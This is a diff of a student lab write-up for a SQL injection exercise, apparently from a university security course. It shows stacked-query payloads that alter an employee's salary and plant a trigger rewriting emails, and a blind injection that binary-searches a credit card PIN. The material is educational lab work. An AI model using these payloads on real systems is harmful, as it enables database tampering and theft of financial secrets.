@@ -44,15 +44,16 @@ SQL injection is a web security vulnerability that allows an attacker to interfe
 
 Part 7 Explanation:
 SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
-If I input (101; UPDATE employee SET salary = 555000 WHERE userid = 101) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; UPDATE employee SET salary = 555000 WHERE userid = 101) which would change employee 101's salary.
-If I input (101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) which would change new employees' email.
+If we input (101; UPDATE employee SET salary = 555000 WHERE userid = 101) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; UPDATE employee SET salary = 555000 WHERE userid = 101) which would change employee 101's salary.
+If we input (101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) which would change new employees' email.
 
 
 Part 8 Explanation:
-
-
-Part8:
+SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
+We can use the following input (101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)) to test where Number2 is 0, 10, 100 , 1000, and 10000...
+And then we find it would change from valid to invalid when Nnumber2 is 10000.
+Then we would use the following two input to do the binary search.
 101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
 101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)
-After finding 4862, check by the command:
+After finding 4862, check by the input:
 101 AND ((select pin from credit where cc_number = 1234123412341234) = 4862)
